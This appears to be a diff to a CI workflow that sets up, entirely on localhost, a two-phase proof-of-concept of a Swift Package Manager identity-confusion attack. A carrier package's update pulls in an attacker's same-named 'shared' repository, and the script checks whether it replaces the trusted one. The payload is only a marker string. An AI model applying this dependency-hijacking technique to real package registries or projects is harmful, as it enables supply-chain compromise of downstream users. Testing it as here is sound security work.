@@ -1,6 +1,5 @@
 name: CI
 on: [push]
-
 jobs:
   git-005:
     name: Dependency resolution
@@ -9,69 +8,73 @@ jobs:
       - uses: swift-actions/setup-swift@v2
         with:
           swift-version: '6.0'
-      - name: Test resolution
+      - name: Two-phase identity confusion
         run: |
           set -e
           WORK=$(mktemp -d)
           git config --global user.name "CI" && git config --global user.email "ci@test"
-          
           mkdir -p $WORK/repos/trusted $WORK/repos/attacker
           
-          # Trusted "shared" package
-          mkdir -p $WORK/trusted-work/Sources/TrustedLib
-          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/trusted-work/Package.swift
-          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/trusted-work/Sources/TrustedLib/Lib.swift
-          git -C $WORK/trusted-work init -q -b main && git -C $WORK/trusted-work add -A && git -C $WORK/trusted-work commit -qm init && git -C $WORK/trusted-work tag 1.0.0
-          git clone -q --bare $WORK/trusted-work $WORK/repos/trusted/shared.git
+          # Trusted "shared"
+          mkdir -p $WORK/tw/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/tw/Package.swift
+          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/tw/Sources/TrustedLib/Lib.swift
+          cd $WORK/tw && git init -q -b main && git add -A && git commit -qm init && git tag 1.0.0
+          git clone -q --bare $WORK/tw $WORK/repos/trusted/shared.git
           touch $WORK/repos/trusted/shared.git/git-daemon-export-ok
           
-          # Attacker "shared" package (same basename, more version tags)
-          mkdir -p $WORK/attacker-work/Sources/TrustedLib
-          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/attacker-work/Package.swift
-          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/attacker-work/Sources/TrustedLib/Lib.swift
-          git -C $WORK/attacker-work init -q -b main && git -C $WORK/attacker-work add -A && git -C $WORK/attacker-work commit -qm init
-          for v in 1.0.0 1.0.1 1.0.2 1.0.3 1.0.4; do git -C $WORK/attacker-work tag $v; done
-          git clone -q --bare $WORK/attacker-work $WORK/repos/attacker/shared.git
+          # Attacker "shared" (same basename, more tags)
+          mkdir -p $WORK/aw/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/aw/Package.swift
+          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/aw/Sources/TrustedLib/Lib.swift
+          cd $WORK/aw && git init -q -b main && git add -A && git commit -qm init
+          for v in 1.0.0 1.0.1 1.0.2 1.0.3 1.0.4; do git tag $v; done
+          git clone -q --bare $WORK/aw $WORK/repos/attacker/shared.git
           touch $WORK/repos/attacker/shared.git/git-daemon-export-ok
           
-          # Start git daemon
-          git daemon --reuseaddr --base-path=$WORK/repos --export-all --enable=receive-pack --port=9418 &
-          DAEMON_PID=$!
+          # Carrier v1.0.0 (no attacker dep yet)
+          mkdir -p $WORK/cw/Sources/CarrierLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],targets:[.target(name:"CarrierLib")])\n' > $WORK/cw/Package.swift
+          echo 'public enum CarrierLib {}' > $WORK/cw/Sources/CarrierLib/Lib.swift
+          cd $WORK/cw && git init -q -b main && git add -A && git commit -qm "v1.0.0" && git tag 1.0.0
+          
+          # git daemon
+          git daemon --reuseaddr --base-path=$WORK/repos --export-all --port=9418 &
           sleep 1
           
-          # Carrier package (introduces attacker's shared via git://)
-          mkdir -p $WORK/carrier-work/Sources/CarrierLib
-          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"git://127.0.0.1/attacker/shared.git",from:"1.0.0")],targets:[.target(name:"CarrierLib")])\n' > $WORK/carrier-work/Package.swift
-          echo 'public enum CarrierLib {}' > $WORK/carrier-work/Sources/CarrierLib/Lib.swift
-          git -C $WORK/carrier-work init -q -b main && git -C $WORK/carrier-work add -A && git -C $WORK/carrier-work commit -qm init && git -C $WORK/carrier-work tag 1.0.0
-          git clone -q --bare $WORK/carrier-work $WORK/repos/carrier.git
+          # Carrier v1.1.0 (NOW adds attacker shared as dependency)
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"git://127.0.0.1/attacker/shared.git",from:"1.0.0")],targets:[.target(name:"CarrierLib")])\n' > $WORK/cw/Package.swift
+          cd $WORK/cw && git add -A && git commit -qm "v1.1.0" && git tag 1.1.0
+          git clone -q --bare $WORK/cw $WORK/repos/carrier.git
           touch $WORK/repos/carrier.git/git-daemon-export-ok
           
-          # Root package: depends on trusted shared + carrier
+          # Root: depends on trusted shared + carrier
           mkdir -p $WORK/root/Sources/App
           printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"root",dependencies:[.package(url:"git://127.0.0.1/trusted/shared.git",from:"1.0.0"),.package(url:"git://127.0.0.1/carrier.git",from:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"TrustedLib",package:"shared"),.product(name:"CarrierLib",package:"carrier")])])\n' > $WORK/root/Package.swift
           echo 'import TrustedLib; print(sharedValue)' > $WORK/root/Sources/App/main.swift
           
-          echo "=== Root manifest ==="
-          cat $WORK/root/Package.swift
+          echo "=== Phase 1: Initial resolve with carrier 1.0.0 (no attacker dep) ==="
+          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -5
+          INIT_OUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
+          echo "initial_output=$INIT_OUT"
+          echo "initial_source=$(cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift)"
           
-          echo "=== Building ==="
-          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -15
+          echo ""
+          echo "=== Phase 2: Update (carrier 1.1.0 introduces attacker/shared.git) ==="
+          swift package update --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -10
+          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -5
+          FINAL_OUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
+          echo "final_output=$FINAL_OUT"
+          echo "final_source=$(cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift)"
           
-          echo "=== Runtime ==="
-          OUTPUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
-          echo "output=$OUTPUT"
-          
-          echo "=== Checkout source ==="
-          cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift 2>/dev/null || echo "checkout not found"
-          
+          echo ""
           echo "=== RESULT ==="
-          if echo "$OUTPUT" | grep -q "ATTACKER-HIJACKED"; then
-            echo "VULNERABLE: Attacker source replaced trusted via identity confusion"
-          elif echo "$OUTPUT" | grep -q "TRUSTED-LEGITIMATE"; then
-            echo "NOT VULNERABLE: Trusted source was used"
+          if [ "$INIT_OUT" = "TRUSTED-LEGITIMATE-SOURCE" ] && echo "$FINAL_OUT" | grep -q "ATTACKER-HIJACKED"; then
+            echo "VULNERABLE: Phase 1 trusted, Phase 2 attacker replaced it"
+          elif echo "$FINAL_OUT" | grep -q "TRUSTED-LEGITIMATE"; then
+            echo "NOT VULNERABLE: Trusted source survived update"
           else
-            echo "UNKNOWN: output=$OUTPUT"
+            echo "PARTIAL: initial=$INIT_OUT final=$FINAL_OUT"
           fi
           
-          kill $DAEMON_PID 2>/dev/null
+          kill $(jobs -p) 2>/dev/null
